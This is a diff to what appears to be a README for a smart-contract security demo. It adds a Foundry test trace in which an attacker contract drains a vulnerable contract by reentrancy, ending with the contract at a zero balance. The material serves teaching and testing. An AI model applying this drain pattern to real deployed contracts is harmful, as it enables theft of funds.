@@ -15,3 +15,74 @@ how to create work
   5.This recursive process continues until the gas limit is reached or the contract’s balance is fully drained
 
   6.the test simulates the real-world conditions of a reentrancy attack, demonstrating the exploit in action
+
+output:
+Traces:
+  [134814] ReentrancyTest::testReentrancyAttack()
+    ├─ [0] console::log("Starting the attack...") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::startPrank(Attackers: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
+    │   └─ ← [Return]
+    ├─ [111544] Attackers::attack{value: 1000000000000000000}()
+    │   ├─ [5260] VulnerableContract::deposit{value: 1000000000000000000}()
+    │   │   └─ ← [Stop]
+    │   ├─ [94025] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
+    │   │   ├─ [86457] Attackers::receive{value: 1000000000000000000}()
+    │   │   │   ├─ [85689] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
+    │   │   │   │   ├─ [78121] Attackers::receive{value: 1000000000000000000}()
+    │   │   │   │   │   ├─ [77353] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
+    │   │   │   │   │   │   ├─ [69785] Attackers::receive{value: 1000000000000000000}()
+    │   │   │   │   │   │   │   ├─ [69017] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
+    │   │   │   │   │   │   │   │   ├─ [61449] Attackers::receive{value: 1000000000000000000}()
+    │   │   │   │   │   │   │   │   │   ├─ [60681] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
+    │   │   │   │   │   │   │   │   │   │   ├─ [53113] Attackers::receive{value: 1000000000000000000}()
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [52345] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [44777] Attackers::receive{value: 1000000000000000000}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [44009] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [36441] Attackers::receive{value: 1000000000000000000}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [35673] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [28105] Attackers::receive{value: 1000000000000000000}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [27337] VulnerableContract::withdrawTest(1000000000000000000 [1e18])      
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19769] Attackers::receive{value: 1000000000000000000}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19001] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8633] Attackers::receive{value: 1000000000000000000}()       
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7865] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [297] Attackers::receive{value: 1000000000000000000}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [0] console::log("Attacker's balance after the attack: %s ether", 11000000000000000000 [1.1e19]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Vulnerable contract's balance after the attack: %s ether", 0) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::assertEq(11000000000000000000 [1.1e19], 11000000000000000000 [1.1e19]) [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(0, 0) [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 31.67ms (27.50ms CPU time)
+
+Ran 1 test suite in 44.10ms (31.67ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
